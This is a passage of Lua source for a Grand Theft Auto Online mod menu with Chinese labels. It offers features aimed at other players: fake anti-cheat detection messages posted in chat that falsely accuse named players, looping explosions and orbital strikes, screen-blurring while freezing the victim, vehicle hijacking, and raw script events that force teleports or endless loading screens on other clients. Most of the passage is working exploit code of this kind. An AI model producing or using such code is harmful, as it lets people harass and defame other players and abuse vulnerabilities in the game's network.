        chat.send_message('> ' .. players.get_name(pid) .. " 触发了检测：Rockstar反作弊 (" .. det_type .. ")", false, true, true)
    end)

    menu.action(chattrolls_root, "虚假XIPRO检测聊天", {}, "用户触发XIPRO检测：Rockstar反作弊 (C1)", function(click_type)
        local types = {'I3', 'C1', 'C2', 'C3', 'C4', 'C5', 'D1', 'D2', 'D3', 'D4', 'D5', 'E1', 'E2', 'I2', 'I1'}
        local det_type = types[math.random(1, #types)]
        chat.send_message('> ' .. players.get_name(pid) .. " 触发了检测：Rockstar反作弊 (" .. det_type .. ") ----XIPRO", false, true, true)
    end)

    menu.action(chattrolls_root, "虚假2take1检测聊天", {}, "用户触发2take1检测：Rockstar反作弊 (C1)", function(click_type)
        local types = {'I3', 'C1', 'C2', 'C3', 'C4', 'C5', 'D1', 'D2', 'D3', 'D4', 'D5', 'E1', 'E2', 'I2', 'I1'}
        local det_type = types[math.random(1, #types)]
        chat.send_message('> ' .. players.get_name(pid) .. " 触发了检测：Rockstar反作弊 (" .. det_type .. ") ----2take1", false, true, true)
    end)

    menu.action(chattrolls_root, "虚假baibai检测聊天", {}, "用户触发baibai检测：Rockstar反作弊 (C1)", function(click_type)
        local types = {'I3', 'C1', 'C2', 'C3', 'C4', 'C5', 'D1', 'D2', 'D3', 'D4', 'D5', 'E1', 'E2', 'I2', 'I1'}
        local det_type = types[math.random(1, #types)]
        chat.send_message('> ' .. players.get_name(pid) .. " 触发了检测：Rockstar反作弊 (" .. det_type .. ") ----baibai", false, true, true)
    end)

    menu.divider(chattrolls_root, "-=-=-=-分离踢-=-=-=-")

    menu.action(chattrolls_root, "虚假XIPRO检测分离踢", {}, "用户触发XIPRO检测：分离踢", function(click_type)
        chat.send_message('> ' .. players.get_name(pid) .. " 触发了检测：分离踢 ----XIPRO", false, true, true)
    end)

    menu.action(chattrolls_root, "虚假2take1检测分离踢", {}, "用户触发2take1检测：分离踢", function(click_type)
        chat.send_message('> ' .. players.get_name(pid) .. " 触发了检测：分离踢 ----2take1", false, true, true)
    end)

    menu.action(chattrolls_root, "虚假baibai检测分离踢", {}, "用户触发baibai检测：分离踢", function(click_type)
        chat.send_message('> ' .. players.get_name(pid) .. " 触发了检测：分离踢 ----baibai", false, true, true)
    end)

    menu.divider(chattrolls_root, "-=-=-=-不同的崩溃-=-=-=-")

    menu.action(chattrolls_root, "虚假XIPRO检测崩溃", {}, "用户触发XIPRO检测：不同的崩溃", function(click_type)
        local types = {'奥特曼崩v1', '奥特曼崩v2', '奥特曼崩v3', '因莎拉崩溃', '露娜崩溃', '悲伤的耶稣崩溃', '大自然崩溃v1', '大自然崩溃v2', '泡泡糖崩溃', '绿玩保护崩溃', '碎片崩溃', '莱纳斯崩溃', '董哥崩溃', '美杜莎崩溃', '马桶崩溃'}
        local det_type = types[math.random(1, #types)]
        chat.send_message('> ' .. players.get_name(pid) .. " 触发了检测：" .. det_type .. " ----XIPRO", false, true, true)
    end)

    menu.action(chattrolls_root, "虚假2take1检测崩溃", {}, "用户触发2take1检测：不同的崩溃", function(click_type)
        local types = {'奥特曼崩v1', '奥特曼崩v2', '奥特曼崩v3', '因莎拉崩溃', '露娜崩溃', '悲伤的耶稣崩溃', '大自然崩溃v1', '大自然崩溃v2', '泡泡糖崩溃', '绿玩保护崩溃', '碎片崩溃', '莱纳斯崩溃', '董哥崩溃', '美杜莎崩溃', '马桶崩溃'}
        local det_type = types[math.random(1, #types)]
        chat.send_message('> ' .. players.get_name(pid) .. " 触发了检测：" .. det_type .. " ----2take1", false, true, true)
    end)

    menu.action(chattrolls_root, "虚假baibai检测崩溃", {}, "用户触发baibai检测：不同的崩溃", function(click_type)
        local types = {'奥特曼崩v1', '奥特曼崩v2', '奥特曼崩v3', '因莎拉崩溃', '露娜崩溃', '悲伤的耶稣崩溃', '大自然崩溃v1', '大自然崩溃v2', '泡泡糖崩溃', '绿玩保护崩溃', '碎片崩溃', '莱纳斯崩溃', '董哥崩溃', '美杜莎崩溃', '马桶崩溃'}
        local det_type = types[math.random(1, #types)]
        chat.send_message('> ' .. players.get_name(pid) .. " 触发了检测：" .. det_type .. " ----baibai", false, true, true)
    end)

    local weapon_trolling = menu.list(playerMain, "武器恶搞", {""}, "选择武器并射击他们无论你在哪里")

	menu.action(weapon_trolling, "用天基炮杀死他", {"orbital"}, "", function()
		if is_player_in_any_interior(pid) then
			notification123:help("该玩家正在室内", HudColour.red)
		elseif is_player_passive(pid) then
			notification123:help("该玩家正处于被动模式", HudColour.red)
		elseif not OrbitalCannon.exists() and PLAYER.IS_PLAYER_PLAYING(pId) then
			OrbitalCannon.create(pid)
		end
	end)

	menu.action(weapon_trolling, "重型狙击枪", {}, "", function()
        heavy_weapon(pid)
	end)

	menu.action(weapon_trolling, "烟花", {}, "", function()
        firework_weapon(pid)
	end)

	menu.action(weapon_trolling, "原子波", {}, "", function()
        raypisol_weapon(pid)
	end)

	menu.action(weapon_trolling, "燃烧弹", {}, "", function()
        fire_weapon(pid)
	end)

	menu.action(weapon_trolling, "电磁脉冲发射器", {}, "", function()
        emp_weapon(pid)
	end)


    local jindianegao = menu.list(playerMain, "经典恶搞", {}, "")
    local jplaym = menu.list(jindianegao, '击飞玩家', {}, '')

    local juglset = {invisjugc = false, jugsel = util.joaat('speedo2') , jugr = 1000}
    local set = {alert = true}
    local jugloop = menu.toggle_loop(jplaym, '开始击飞', {'JuggleC'}, '反复击飞玩家', function ()
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
    local pname = PLAYER.GET_PLAYER_NAME(pid)


        Delcar(targets)
        Streament(juglset.jugsel)

    if not PED.IS_PED_RAGDOLL(targets) then
        JuggleCar(juglset.jugsel, tar1, juglset.invisjugc, juglset.jugr)
        else
            if set.alert then
                util.toast(pname..' 正在被击飞')
            end
    end

    if not players.exists(pid) then
        if set.alert then
            util.toast('你让他们怒不可遏')
        end
        util.stop_thread()
    end

  end)

menu.set_value(jugloop, nil)

menu.toggle(jplaym, '隐形载具', {}, '将攻击载具更改为不可见', function (on)
    juglset.invisjugc = on
end)

local jclist = menu.list(jplaym, '更改用于击飞的载具', {}, '')
menu.list_action(jclist, '载具列表', {''}, '更改用于击飞的载具', Vehlist, function(jugsel)
    juglset.jugsel = util.joaat(Vehha[jugsel])
end)

menu.slider(jplaym, '击飞频率', {'jugglerate'}, '更改载具击飞间隔速度', 100, 4000, 1000, 100, function (jr)
    juglset.jugr = jr
end)

menu.text_input(jclist, '输入自定义载具模型名', {'cusjug'}, '输入车辆模型名以更改载具为攻击载具', function(cusveh)
    if STREAMING.IS_MODEL_A_VEHICLE(util.joaat(cusveh)) then
        juglset.jugsel = util.joaat(cusveh)
    else
        if set.alert then
            util.toast('载具名称不正确(请检查你的拼写)')
        end
    end
end, 'toreador')

local mrplaym = menu.list(jindianegao, '在玩家身上下雨 ', {}, '')
local mir = {weap = 'WEAPON_SNOWBALL', speed = 1000}
local mirloop =  menu.toggle_loop(mrplaym, '类型:雪球', {'rain'}, '启用下雨', function ()
      local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
      local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
      local weap = util.joaat(mir.weap)
      Delcar(targets)
      WEAPON.REQUEST_WEAPON_ASSET(weap)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z, tar1.x , tar1.y, tar1.z - 2.0, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 1.0, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y + 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x + 1.0, tar1.y , tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x + 1.0, tar1.y + 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x - 1.0, tar1.y, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y - 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x - 1.0, tar1.y - 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
  
      if not players.exists(pid) then
          if set.alert then
              util.toast('你让他们怒不可遏')
          end
          util.stop_thread()
      end
  end)
  
 menu.list_action(mrplaym, '类型', {''}, '更改在玩家身上下雨的类型', Weaplist, function(weapsel, text)
      mir.weap = Weap[weapsel]
      menu.set_menu_name(mirloop, '在玩家身上下雨 ' ..': '.. text)
  end)

 local weaspeed = menu.slider(mrplaym, '下雨速度', {''}, '更改下雨的速度', 100, 6000, 1000, 100, function (s)
      mir.speed = s
  end)

  local eplaym = menu.list(jindianegao, '爆炸玩家', {}, '')
-------------------------------------
local exset = {exsel = 0, scale = 1000, isaud = true, invis = false, shake = 0, damage = false, delay = 1}
local exloop = menu.toggle_loop(eplaym, '类型:手榴弹', {'EXPL'}, '循环爆炸玩家', function ()
     local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
     local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)


     FIRE.ADD_EXPLOSION(tar1.x, tar1.y, tar1.z - 1, exset.exsel, exset.scale, exset.isaud, exset.invis, exset.shake, exset.damage)
     FIRE.ADD_EXPLOSION(tar1.x, tar1.y, tar1.z - 0.5, exset.exsel, exset.scale, exset.isaud, exset.invis, exset.shake, exset.damage)
     FIRE.ADD_EXPLOSION(tar1.x, tar1.y, tar1.z, exset.exsel, exset.scale, exset.isaud, exset.invis, exset.shake, exset.damage)
     FIRE.ADD_EXPLOSION(tar1.x, tar1.y, tar1.z + 0.5, exset.exsel, exset.scale, exset.isaud, exset.invis, exset.shake, exset.damage)
     util.yield(exset.delay)

     if not players.exists(pid) then
         if set.alert then
             util.toast('你让他们怒不可遏')
         end
         util.stop_thread()
     end
 end)


 menu.list_action(eplaym, '更改爆炸类型', {''}, '更改爆炸玩家的类型', bmobdifficent,function(index, text)
     menu.set_menu_name(exloop, '循环爆炸类型 ' ..': '.. text)
     exset.exsel = index - 1
 end)

 menu.slider(eplaym, '更改爆炸大小', {''}, '更改爆炸玩家的大小', 100, 6000, 1000, 100, function (s)
     exset.scale = s
  end)

  menu.toggle(eplaym, '隐形爆炸', {''}, '让玩家看不见爆炸', function (on)
     exset.invis = on
 end)

 menu.toggle(eplaym, '无声爆炸', {''}, '让玩家听不见爆炸', function (on)
     exset.isaud = not on
 end)

 menu.slider(eplaym, '晃动视角数值', {''}, '调整由爆炸引起的视角晃动数值', 0, 100, 0, 10, function (sh)
     exset.shake = sh
  end)

  menu.toggle(eplaym, '无伤爆炸', {''}, '让玩家受不到爆炸伤害', function (on)
     exset.damage = on
 end)

 menu.slider(eplaym, '延迟', {''}, '调成距离上一次爆炸的延迟', 0, 1000, 100, 10, function (de)
     exset.delay = de
  end)

-------------------------------------------------

local blurred_screen = menu.list(jindianegao, "花屏", {}, "", function(); end)
    menu.toggle(blurred_screen, "花屏V1", {""}, "请远离该玩家", function(state)
        huaping_1 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_1 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "ent_ray_heli_aprtmnt_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "花屏V2", {""}, "请远离该玩家", function(state)
        huaping_2 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_2 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_sht_paint_cans", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false) 
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "花屏V3", {""}, "请远离该玩家", function(state)
        huaping_3 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_3 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "ent_dst_inflatable", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "花屏V4", {""}, "请远离该玩家", function(state)
        huaping_4 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_4 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "ent_sht_extinguisher_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "花屏V5", {""}, "请远离该玩家", function(state)
        huaping_5 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_5 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("scr_sum2_hal")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_death_green", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "花屏V6", {""}, "请远离该玩家", function(state)
        huaping_6 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_6 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("scr_sum2_hal")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_death_blue", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "花屏V7", {""}, "请远离该玩家", function(state)
        huaping_7 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_7 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("scr_sum2_hal")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_death_greyblack", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "花屏V8", {""}, "请远离该玩家", function(state)
        huaping_8 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_8 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("scr_sum2_hal")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_death_orange", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "花屏V9", {""}, "请远离该玩家", function(state)
        huaping_9 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_9 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "ent_sht_oil", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    local freeze = menu.list(jindianegao, "冻结", {}, "")
    menu.toggle_loop(jindianegao, "脚本冻结", {}, "", function()
        util.trigger_script_event(1 << pid, {-93722397, pid, 0, 0, 0, 0, 0})
        util.yield(500)
    end)

    player_toggle_loop(freeze, pid, "模型冻结", {"modelfreeze"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
    end)

    menu.toggle_loop(jindianegao, "循环喷火", {"flameloop"}, "经典恶搞之一", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 12, 100.0, true, false, 0.0)
    end)

    menu.toggle_loop(jindianegao, "循环喷水", {"waterloop"}, "经典恶搞之一", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 13, 100.0, true, false, 0.0)
    end)

    menu.toggle_loop(jindianegao, "随机循环", {"randomloop"}, "经典恶搞之一", function(on)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], math.random(0, 82), 1.0, true, false, 0.0)
    end)

	menu.toggle_loop(jindianegao, "折腾玩家", {"tossplayers"}, "在玩家身上循环无损伤的爆炸", function()
        local playerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), true)

        SE_add_explosion(playerCoords['x'], playerCoords['y'], playerCoords['z'], 1, 1, SEisExploAudible, SEisExploInvis, 0, true)
    end)	
	local glitch_player_list = menu.list(jindianegao, "鬼畜玩家", {"glitchdelay"}, "")
    local object_hash = util.joaat("prop_ld_ferris_wheel")
    menu.list_select(glitch_player_list, "物体", {}, "选择鬼畜玩家使用的物体.", object_stuff.names, 1, function(index)
        object_hash = util.joaat(object_stuff.objects[index])
    end)

    menu.slider(glitch_player_list, "物体生成延迟", {"spawndelay"}, "", 0, 3000, 50, 10, function(amount)
        delay = amount
    end)

    local glitchPlayer = false
    local glitchPlayer_toggle
    glitchPlayer_toggle = menu.toggle(glitch_player_list, "启用", {}, "", function(toggled)
        glitchPlayer = toggled

        while glitchPlayer do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("这傻逼超出你的范围了 没法整. :/")
                menu.set_value(glitchPlayer_toggle, false)
            break end

            if not players.exists(pid) then 
                util.toast("找不到这傻逼,看看他还在战局吗?")
                menu.set_value(glitchPlayer_toggle, false)
            util.stop_thread() end

            local glitch_hash = object_hash
            local poopy_butt = util.joaat("rallytruck")
            request_model(glitch_hash)
            request_model(poopy_butt)
            local stupid_object = entities.create_object(glitch_hash, pos)
            local glitch_vehicle = entities.create_vehicle(poopy_butt, pos, 0)
            ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
            ENTITY.SET_ENTITY_VISIBLE(glitch_vehicle, false)
            ENTITY.SET_ENTITY_INVINCIBLE(stupid_object, true)
            ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(glitch_vehicle, 1, 0.0, 10, 10, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            util.yield(delay)
            entities.delete_by_handle(stupid_object)
            entities.delete_by_handle(glitch_vehicle)
            util.yield(delay)    
        end
    end)

    local inf_loading = menu.list(jindianegao, "无限加载屏幕", {}, "")
    menu.action(inf_loading, "传送邀请", {}, "被大多数菜单拦截", function()
        util.trigger_script_event(1 << pid, {879177392, pid, 0, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(inf_loading, "公寓邀请", {}, "被大多数菜单拦截", function()
        util.trigger_script_event(1 << pid, {434937615, pid, 0, 1, id})
    end)
        
    menu.textslider(inf_loading, "资产邀请", {}, "单击以选择样式", invites, function(index, name)
        switch name do
            case "Yacht":
                util.trigger_script_event(1 << pid, {-1891171016, pid, 1})
                util.toast("游艇邀请已发送")
            break
            case "Office":
                util.trigger_script_event(1 << pid, {-1891171016, pid, 2})
                util.toast("办公室邀请已发送")
            break
            case "Clubhouse":
                util.trigger_script_event(1 << pid, {-1891171016, pid, 3})
                util.toast("会所邀请已发送")
            break
            case "Office Garage":
                util.trigger_script_event(1 << pid, {-1891171016, pid, 4})
                util.toast("办公室车库邀请已发送")
            break
            case "Custom Auto Shop":
                util.trigger_script_event(1 << pid, {-1891171016, pid, 5})
                util.toast("载具改装铺邀请已发送")
            break
            case "Apartment":
                util.trigger_script_event(1 << pid, {-1891171016, pid, 6})
                util.toast("公寓邀请已发送")
            break
        end
    end)


    player_toggle_loop(jindianegao, pid, "使该玩家黑屏", {}, "将此玩家传送到会所来达到黑屏", function()
        util.trigger_script_event(1 << pid, {879177392, pid, math.random(1, 32), 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        util.yield(1000)
    end)

    local control_veh = false
    local control_veh_cmd
    control_veh_cmd = menu.toggle(jindianegao, "控制玩家车辆", {}, "必须在陆地上的车辆中才可以使用.", function(toggle)
        control_veh = toggle

        while control_veh do 
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            local player_veh = PED.GET_VEHICLE_PED_IS_IN(ped)
            local class = VEHICLE.GET_VEHICLE_CLASS(player_veh)
            if not players.exists(pid) then util.stop_thread() end

            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("玩家太远了. :/")
                menu.set_value(control_veh_cmd, false)
            return end

            if class == 15 then
                util.toast("玩家在直升机上. :/")
                menu.set_value(control_veh_cmd, false)
            break end
            
            if class == 16 then
                util.toast("玩家在飞机上. :/")
                menu.set_value(control_veh_cmd, false)
            return end

            if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
                if PAD.IS_CONTROL_PRESSED(0, 34) then
                    while not PAD.IS_CONTROL_RELEASED(0, 34) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 7, 100)
                        util.yield()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 35) then
                    while not PAD.IS_CONTROL_RELEASED(0, 35) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 8, 100)
                        util.yield()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 32) then
                    while not PAD.IS_CONTROL_RELEASED(0, 32) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 23, 100)
                        util.yield()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 33) then
                    while not PAD.IS_CONTROL_RELEASED(0, 33) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 28, 100)
                        util.yield()
                    end
                end
            else
                util.toast("玩家不在车内. :/")
                menu.set_value(control_veh_cmd, false)
            end
            util.yield()
        end
    end)

	menu.toggle_loop(jindianegao, "原子弹轰炸", {"atomicbomb"}, "", function(on_click)
        do
        orbital(pid)
        end
    end)
                   
    menu.toggle_loop(jindianegao,"火箭雨", {'rockets'}, '', function()
        rain_rockets(pid, false)
        util.yield(500)
    end)

    menu.toggle_loop(jindianegao,"循环电击枪", {"stungunloop"}, "在此玩家周围生成电击枪发射音效", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        for i = 1, 50 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
        end
        util.yield(100)
    end)

    menu.toggle_loop(jindianegao,"循环原子能枪", {"atomicgunloop"}, "在此玩家周围生成原子能枪发射音效", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z - 0.3, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_raypistol"), players.user_ped(), true, false, 1.0)
        util.yield(250)
    end)

    menu.toggle_loop(jindianegao,"将玩家推向前方", {"pushplayerforward"}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player, false)
        local glitch_hash = util.joaat("prop_shuttering03")
        request_model(glitch_hash)
        local dumb_object_front = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 1, 0))
        local dumb_object_back = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 0))
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_front, false)
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_back, false)
        util.yield()
        entities.delete_by_handle(dumb_object_front)
        entities.delete_by_handle(dumb_object_back)
        util.yield() 
    end)

    player_toggle_loop(jindianegao,pid, "弹飞玩家", {}, "也适用于载具", function() 
        local poopy_butt = util.joaat("adder")
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        pos.z -= 10
        request_model(poopy_butt)
        local vehicle = entities.create_vehicle(poopy_butt, pos, 0)
        ENTITY.SET_ENTITY_VISIBLE(vehicle, false)
        util.yield(250)
        if vehicle ~= 0 then
            ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 100, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            util.yield(250)
            entities.delete_by_handle(vehicle)
        end
    end)

    local glitchForcefield = false
    local glitchforcefield_toggle
    glitchforcefield_toggle = menu.toggle(jindianegao, "范围删除", {}, "启用后会将此玩家附近的模型删除", function(toggled)
        glitchForcefield = toggled
        local glitch_hash = util.joaat("p_spinning_anus_s")
        request_model(glitch_hash)

        while glitchForcefield do
            local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
